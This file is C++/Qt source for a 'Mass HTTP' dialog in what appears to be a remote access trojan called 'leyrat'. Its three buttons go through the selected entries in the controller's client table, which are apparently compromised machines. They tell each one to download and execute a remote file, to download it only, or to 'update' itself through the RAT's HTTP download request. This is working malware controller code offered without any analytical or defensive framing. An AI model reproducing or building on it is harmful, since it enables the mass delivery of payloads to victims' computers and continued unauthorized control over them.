#include "masshttp.h"
#include "ui_masshttp.h"

#include "mainwindow.h"
#include "ui_mainwindow.h"
#include "leyrat.h"

extern Ui::MainWindow *mainwin;
extern leyrat rat;

Masshttp::Masshttp(QWidget *parent) :
    QDialog(parent),
    ui(new Ui::Masshttp)
{
    ui->setupUi(this);
    this->setWindowTitle("Mass HTTP");

    ui->pushButton->setFocusPolicy(Qt::NoFocus);
    ui->pushButton_2->setFocusPolicy(Qt::NoFocus);
    ui->pushButton_3->setFocusPolicy(Qt::NoFocus);
    this->setWindowFlags(windowFlags() & ~Qt::WindowContextHelpButtonHint | Qt::MSWindowsFixedSizeDialogHint);
}

Masshttp::~Masshttp()
{
    delete ui;
}

void Masshttp::on_pushButton_pressed()//mass download&exec
{
    QList<QTableWidgetItem *> selected = mainwin->tableWidget->selectedItems();
    QTableWidgetItem *item;

    foreach (item, selected) {

        if(item->column() != 2)  continue;
        rat.Request_HTTPDownload(item->text().toStdString().c_str(), ui->plainTextEdit->toPlainText().toStdString().c_str(), ui->plainTextEdit_2->toPlainText().toStdString().c_str(), true, false);
    }

}

void Masshttp::on_pushButton_2_pressed()//mass download
{
    QList<QTableWidgetItem *> selected = mainwin->tableWidget->selectedItems();
    QTableWidgetItem *item;

    foreach (item, selected) {

        if(item->column() != 2)  continue;
        rat.Request_HTTPDownload(item->text().toStdString().c_str(), ui->plainTextEdit->toPlainText().toStdString().c_str(), ui->plainTextEdit_2->toPlainText().toStdString().c_str(), false, false);
    }
}

void Masshttp::on_pushButton_3_pressed()//mass update
{

    QList<QTableWidgetItem *> selected = mainwin->tableWidget->selectedItems();
    QTableWidgetItem *item;

    foreach (item, selected) {

        if(item->column() != 2)  continue;
        rat.Request_HTTPDownload(item->text().toStdString().c_str(), ui->plainTextEdit->toPlainText().toStdString().c_str(), ui->plainTextEdit_2->toPlainText().toStdString().c_str(), false, true);
    }
}
